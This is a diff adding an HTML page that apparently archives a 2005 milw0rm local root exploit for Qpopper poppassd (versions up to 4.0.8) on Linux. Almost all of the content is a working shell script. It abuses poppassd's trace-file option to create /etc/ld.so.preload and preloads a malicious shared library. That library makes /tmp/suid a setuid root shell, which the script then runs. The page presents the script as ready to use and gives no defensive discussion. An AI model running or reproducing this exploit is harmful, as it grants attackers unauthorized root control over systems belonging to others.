@@ -1,0 +1,67 @@
+<html>
+<head>
+<title>Qpopper <= 4.0.8 (poppassd) Local Root Exploit (linux)</title>
+<pre>
+#!/bin/sh
+# tested and working /str0ke
+###########################################################################
+# Linux Qpopper poppassd latest version local r00t exploit by kcope     ###
+# August 2005                                                           ###
+# Confidential - Keep Private!                                          ###
+###########################################################################
+
+POPPASSD_PATH=/usr/local/bin/poppassd
+
+echo &quot;&quot;
+echo &quot;Linux Qpopper poppassd latest version local r00t exploit by kcope&quot;
+echo &quot;&quot;
+sleep 2
+umask 0000
+if [ -f /etc/ld.so.preload ]; then
+echo &quot;OOPS /etc/ld.so.preload already exists.. exploit failed!&quot;
+exit
+fi
+cat &gt; program.c &lt;&lt; _EOF
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init()
+{
+ if (!geteuid()) {
+ setgid(0);
+ setuid(0);
+ remove(&quot;/etc/ld.so.preload&quot;);
+ execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-c&quot;,&quot;chown root:root /tmp/suid; chmod +s /tmp/suid&quot;,NULL);
+ }
+}
+
+_EOF
+gcc -o program.o -c program.c -fPIC
+gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
+cat &gt; suid.c &lt;&lt; _EOF
+int main(void) {
+       setgid(0); setuid(0);
+       unlink(&quot;/tmp/suid&quot;);
+       execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0); }
+_EOF
+
+gcc -o /tmp/suid suid.c
+cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
+echo &quot;--- Now type ENTER ---&quot;
+echo &quot;&quot;
+$POPPASSD_PATH -t /etc/ld.so.preload
+echo /tmp/libno_ex.so.1.0 &gt; /etc/ld.so.preload
+su
+if [ -f /tmp/suid ]; then
+echo &quot;IT'S A ROOTSHELL!!!&quot;
+/tmp/suid
+else
+echo &quot;Sorry, exploit failed.&quot;
+fi
+
+# milw0rm.com [2005-09-24]
+</pre>
+</html>
+
